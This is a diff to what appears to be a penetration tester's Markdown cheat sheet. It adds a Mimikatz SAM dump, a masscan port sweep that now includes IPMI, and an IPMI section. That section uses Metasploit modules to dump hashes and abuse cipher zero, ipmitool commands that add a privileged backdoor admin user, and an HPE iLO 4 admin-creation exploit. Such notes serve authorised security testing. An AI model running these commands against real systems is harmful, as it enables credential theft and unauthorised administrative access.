@@ -1,4 +1,4 @@
-﻿[**High-Speed Pizza Delivery**](https://snovvcrash.github.io)
+﻿Back to the main page: [🔙](https://snovvcrash.github.io/)
 
 [//]: # (# -- 5 spaces)
 [//]: # (## -- 4 spaces)
@@ -1691,16 +1691,25 @@ meterpreter > lsa_dump_secrets
 
 
 
-### Pypykatz
+### Reusing Open Handles
 
 * [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
+* [https://github.com/jfmaes/SharpHandler](https://github.com/jfmaes/SharpHandler)
 
 
 
-### SAM
+### Remotely
+
+* [https://github.com/G0ldenGunSec/SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump)
 
 
-#### Mimikatz
+
+
+## SAM
+
+
+
+### Mimikatz
 
 ```
 PS > Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log sam.txt" "lsadump::sam" "exit"'
@@ -2353,6 +2362,7 @@ Top TCP ports:
 | 389,636                                      | LDAP,LDAP over SSL/TLS           |
 | 443,8443                                     | SSL/TLS                          |
 | 593                                          | HTTP RPC Endpoint Mapper         |
+| 623                                          | IPMI                             |
 | 873                                          | RSYNC                            |
 | 1090,1098,1099,4444,11099,47001,47002,10999  | Java RMI                         |
 | 1433                                         | MSSQL                            |
@@ -2398,10 +2408,11 @@ Top UDP ports:
 |  137 | NetBIOS    |
 |  161 | SNMP       |
 |  500 | IKE        |
+|  623 | IPMI       |
 | 3391 | RD Gateway |
 
 ```
-$ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
+$ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,623,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
 
 $ sudo masscan [-e eth0] --rate 500 --open -p$ports -iL hosts.txt --resume paused.conf >> masscan.out
 $ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
@@ -3675,6 +3686,91 @@ Subject: Job offer
 Hello, I would like to offer you a great job!
 .
 QUIT
+```
+
+
+
+
+
+# IPMI
+
+* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
+
+
+
+
+## Discovery
+
+```
+msf > use auxiliary/scanner/ipmi/ipmi_version
+```
+
+
+
+
+## Dump Hashes
+
+**CVE-2013-4786**
+
+```
+msf > use scanner/ipmi/ipmi_dumphashes
+```
+
+
+
+
+## Cipher Zero
+
+**CVE-2013-4805**
+
+Discover with MSF:
+
+```
+msf > use scanner/ipmi/ipmi/ipmi_cipher_zero
+```
+
+Guess existing admin username. If `Administrator` username is correct, the `list` command will succeed (password doesn't matter):
+
+```
+$ sudo apt install ipmitool
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user list
+```
+
+Add new admin user (only existing admin username is needed):
+
+```
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user set name <ID> snovvcrash
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user set password <ID> 'Passw0rd!'
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user priv <ID> 4
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U Administrator -P DummyPassw0rd user enable <ID> 3
+```
+
+
+
+
+## HPE iLO 4
+
+* [https://codeby.net/threads/poluchaem-dostup-k-hp-ilo.63224/](https://codeby.net/threads/poluchaem-dostup-k-hp-ilo.63224/)
+* [https://github.com/airbus-seclab/ilo4_toolbox](https://github.com/airbus-seclab/ilo4_toolbox)
+
+
+
+### Add Admin User
+
+**CVE-2017-12542**
+
+Exploit with Python:
+
+* [https://www.exploit-db.com/exploits/44005](https://www.exploit-db.com/exploits/44005)
+
+```
+$ ./44005.py -t -e -u snovvcrash -p 'Passw0rd!' 127.0.0.1
+```
+
+Exploit with MSF:
+
+```
+msf > use auxiliary/admin/hp/hp_ilo_create_admin_account
 ```
 
 
@@ -7014,7 +7110,7 @@ git://127.0.0.1:6379/%0a<REDIS_COMMANDS>
 
 
 
-### Path Traversal → RCE (CE/EE)
+### Path Traversal → LFI → RCE (CE/EE)
 
 **CVE-2020-10977**
 
@@ -7023,7 +7119,7 @@ git://127.0.0.1:6379/%0a<REDIS_COMMANDS>
 
 
 
-### Path Traversal → RCE (EE)
+### Path Traversal → File Write → RCE (EE)
 
 **CVE-2019-19088**
 
